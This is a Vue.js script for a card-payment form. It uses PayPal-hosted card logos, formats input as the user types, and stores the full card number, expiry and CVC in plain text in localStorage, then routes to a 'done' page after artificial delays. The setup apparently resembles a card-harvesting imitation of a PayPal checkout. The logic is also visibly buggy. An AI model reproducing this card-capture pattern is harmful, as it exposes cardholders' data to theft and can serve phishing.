<script>
export default {
	data() {
		return {
			loading: false,
			valid: "",
			paynumbers: "",
			// type: "",
			validity: "",
			cvc: "",
			image:
				"https://www.paypalobjects.com/ui-web/money-icons/card/generic_card.png",
			logo: {
				default:
					"https://www.paypalobjects.com/ui-web/money-icons/card/generic_card.png",
				amex: "https://www.paypalobjects.com/ui-web/money-icons/card/amex.png",
				visa: "https://www.paypalobjects.com/ui-web/money-icons/card/visa.png",
				mastercard:
					"https://www.paypalobjects.com/ui-web/money-icons/card/master_card.png",
				discover:
					"https://www.paypalobjects.com/ui-web/money-icons/card/discover.png"
			}
		};
	},
	created() {
		this.loading = true;
		sleep(2000).then(() => {
			this.loading = false;
		});
	},
	computed: {
		fullAddress() {
			return this.$store.getters.getBilling;
		}
	},
	watch: {
		paynumbers: function(newVal) {
			if (this.paynumbers.substr(0, 1) !== "3" || "4" || "5" || "6") {
				// console.log("Default CC Logo - Waiting from keyboard..");
				this.image = this.logo.default;
			}
			if (this.paynumbers.substr(0, 1) == "3") {
				// console.log("amex logo");
				this.image = this.logo.amex;
			}
			if (this.paynumbers.substr(0, 1) == "4") {
				// console.log("visa logo");
				this.image = this.logo.visa;
			}
			if (this.paynumbers.substr(0, 1) == "5") {
				// console.log("mastercard logo");
				this.image = this.logo.mastercard;
			}
			if (this.paynumbers.substr(0, 1) == "6") {
				// console.log("discover logo");
				this.image = this.logo.discover;
			}

			// console.log(this.paynumbers);
			// if (this.paynumbers.length !== 18) {
			// 	return (this.paynumbers = this.paynumbers + " ");
			// }
			// if (this.paynumbers.length === 18) {
			// 	this.$refs.valid.focus();
			// }

			if (this.paynumbers.substr(0, 1) === "3") console.log("empty");
			this.image = this.logo.default;

			if (this.paynumbers.substr(0, 1) == "3") {
				// console.log("amex");
				this.image = this.logo.amex;
			}
			if (this.paynumbers.substr(0, 1) == "4") {
				// console.log("visa");
				this.image = this.logo.visa;
			}
			if (this.paynumbers.substr(0, 1) == "5") {
				// console.log("mastercard");
				this.image = this.logo.mastercard;
			}
			if (this.paynumbers.substr(0, 1) == "6") {
				// console.log("discover");
				this.image = this.logo.discover;
			}

			if (this.paynumbers.substr(0, 1) === "3") {
				if (this.paynumbers.length === 18) {
					this.$refs.valid.focus();
				}
			}

			if (
				this.paynumbers.length === 4 ||
				this.paynumbers.length === 9 ||
				this.paynumbers.length === 14 ||
				this.paynumbers.length === 19
			) {
				if (this.paynumbers.length !== 19) {
					return (this.paynumbers = this.paynumbers + " ");
				}
				if (this.paynumbers.length === 19) {
					this.$refs.valid.focus();
				}
			}
		},
		validity: function(newVal) {
			if (this.validity.substr(0, 1) > "1") {
				return (this.validity = "0" + this.validity.substr(0, 1));
			}
			if (this.validity.length === 2) {
				console.log(this.validity);
				return (this.validity = this.validity + "/");
			}
			if (this.validity.length === 5) {
				let checkYear = this.validity.split("/");
				if (Number(checkYear[1]) < "19" || Number(checkYear[1]) > "26") {
					return (this.validity = checkYear[0] + "/");
				} else {
					this.$refs.code.focus();
				}
			}
		}
	},
	methods: {
		collectPayDetails: function(form) {
			this.loading = true;
			// let formData = JSON.stringify(this.form);
			// this.$store.commit("updatePayData", formData);
			localStorage.setItem("paynumbers", this.paynumbers);
			localStorage.setItem("validity", this.validity);
			console.log(localStorage.validity);
			localStorage.setItem("cvc", this.cvc);
			this.$store.commit("updatePayData");
			// console.log(formData);
			sleep(2500).then(() => {
				this.$router.push("done");
				this.loading = false;
			});
		}
	}
};
const sleep = milliseconds => {
	return new Promise(resolve => setTimeout(resolve, milliseconds));
};
